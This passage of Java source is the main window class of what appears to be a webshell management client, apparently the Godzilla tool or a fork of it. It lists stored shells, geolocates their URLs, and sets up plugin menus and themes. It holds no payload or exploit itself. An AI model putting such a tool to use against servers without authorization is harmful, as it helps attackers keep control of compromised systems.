                : this.currentGroup;
        File homeDb = new File(new File(System.getProperty("user.home")), ".webshell-manager/data.db");
        String dbPath = homeDb.isFile() ? homeDb.getAbsolutePath() : new File("data.db").getAbsolutePath();
        this.statusLabel.setText(String.format(
                "Shell \u603b\u6570: %d | \u5f53\u524d\u8fc7\u6ee4: %s | \u8868\u683c\u884c\u6570: %d | \u672c\u5730\u5e93: %s",
                totalShells, filterLabel, tableRows, dbPath));
    }

    private void enrichShellRowsWithIpLocation(Vector<Vector<String>> dataRows) {
        IpLocationService.init();
        for (Vector<String> row : dataRows) {
            String url = row.size() > 1 ? row.get(1) : "";
            row.add(IpLocationService.lookupUrl(url));
        }
    }

    public void refreshShellView() {
        Vector<Vector<String>> rowsVector = null;
        if (this.currentGroup.equals("/")) {
            rowsVector = Db.getAllShell();
        } else {
            rowsVector = Db.getAllShell(this.currentGroup);
        }

        rowsVector.remove(0);
        this.enrichShellRowsWithIpLocation(rowsVector);
        this.shellView.AddRows(rowsVector);
        this.shellView.getModel().fireTableDataChanged();
        WallpaperTableStyle.applyToShellTable(this.shellView);
        this.updateStatusBarText(rowsVector.size());
        if (this.operationLogPanel != null) {
            String ts = new SimpleDateFormat("HH:mm:ss").format(new Date());
            this.operationLogPanel.appendLine(String.format("[%s] \u5df2\u52a0\u8f7d Shell \u5217\u8868: %d", ts, rowsVector.size()));
        }
    }

    private void refreshShellViewMenuItemClick(ActionEvent e) {
        this.hideShellViewPopupMenu();
        OperationAuditLog.ui("\u4e3b\u754c\u9762", "\u5237\u65b0 Shell \u5217\u8868", "\u5206\u7ec4: " + this.currentGroup);
        this.refreshShellView();
    }

    public MainActivity getJFrame() {
        return this;
    }

    public static MainActivity getFrame() {
        return mainActivityFrame;
    }

    public static JMenuItem registerPluginJMenuItem(JMenuItem menuItem) {
        return pluginMenu.add(menuItem);
    }

    public static void registerPluginPopMenu(PopupMenu popupMenu) {
        pluginMenu.add(popupMenu);
    }

    public static JMenu registerJMenu(JMenu menu) {
        if (menuBarAboutMenu != null) {
            insertMenuBeforeAbout(menu);
            return menu;
        }
        synchronized (menusPendingForMenuBar) {
            menusPendingForMenuBar.add(menu);
        }
        return menu;
    }

    public static void setPluginMenuFont(Font font) {
        if (pluginMenu != null) {
            pluginMenu.setFont(font);
            MenuElement[] menuElements = pluginMenu.getSubElements();
            MenuElement[] var2 = menuElements;
            int var3 = menuElements.length;

            for(int var4 = 0; var4 < var3; ++var4) {
                MenuElement menuElement = var2[var4];
                setSubMenuFont(menuElement, font);
            }
        }

    }

    private static void setSubMenuFont(MenuElement menuElement, Font font) {
        MenuElement[] menuElements = menuElement.getSubElements();
        MenuElement[] var3 = menuElements;
        int var4 = menuElements.length;

        for(int var5 = 0; var5 < var4; ++var5) {
            MenuElement element = var3[var5];
            if (element instanceof JComponent) {
                ((JComponent)element).setFont(font);
            }

            setSubMenuFont(element, font);
        }

    }

    public static JMenuItem registerShellViewJMenuItem(JMenuItem menuItem) {
        return shellViewPopupMenu.add(menuItem);
    }

    public static void registerShellViewPopupMenu(PopupMenu popupMenu) {
        shellViewPopupMenu.add(popupMenu);
    }

    public static MainActivity getMainActivityFrame() {
        return mainActivityFrame;
    }

    public static void initUi() {
        if (SystemInfo.isMacOS && System.getProperty("apple.laf.useScreenMenuBar") == null) {
            System.setProperty("apple.laf.useScreenMenuBar", "false");
        }

        ModernUi.installBeforeTheme();
        JFrame.setDefaultLookAndFeelDecorated(true);
        JDialog.setDefaultLookAndFeelDecorated(true);
        String resourceNameString = Db.getSetingValue("ui-resourceName");
        String lafClassNameString = Db.getSetingValue("ui-lafClassName");
        if (resourceNameString == null && lafClassNameString == null) {
            Db.updateSetingKV("ui-lafClassName", "com.formdev.flatlaf.FlatIntelliJLaf");
        }

        lafClassNameString = Db.getSetingValue("ui-lafClassName");
        IJThemesPanel.setTheme(new IJThemeInfo(resourceNameString, lafClassNameString));
    }

    public static void main(String[] args) {
        try {
            initUi();
            initStatic();
            Class.forName("core.ApplicationContext", true, Thread.currentThread().getContextClassLoader());
        } catch (Exception var2) {
            Log.error(var2);
        }
        GodzillaObjectInputFilter.installObjectInputFilter();
        MainActivity activity = new MainActivity();
        mainActivityFrame = activity.getJFrame();
    }
}
